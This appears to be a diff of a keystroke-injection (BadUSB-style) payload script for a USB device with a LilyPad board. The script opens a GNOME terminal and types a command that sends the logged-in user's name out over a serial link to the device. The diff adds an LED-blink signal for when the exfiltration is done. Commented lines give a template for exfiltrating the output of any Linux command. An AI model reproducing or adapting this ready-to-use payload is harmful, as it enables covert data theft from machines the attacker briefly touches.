@@ -1,8 +1,12 @@
 Rem: Exfiltrate UserName from Linux Box using a Serial Link
+DefaultDelay:1000
 Press:134+195
 PrintLine:gnome-terminal
 CustomDelay:1000
+Rem: Exfiltrate Username
 PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad* &
+Rem: Blink the LED to signal when done exfiltrating data
+PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "BlinkLED:3" > /dev/serial/by-id/*LilyPad* &
 Rem: More examples below
 Rem: PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(whoami) > /dev/serial/by-id/*LilyPad*
 Rem: In example below replace "LINUX COMMAND HERE": PrintLine:stty -F /dev/serial/by-id/*LilyPad* 38400;echo "SerialEXFIL:"$(LINUX COMMAND HERE) > /dev/serial/by-id/*LilyPad*
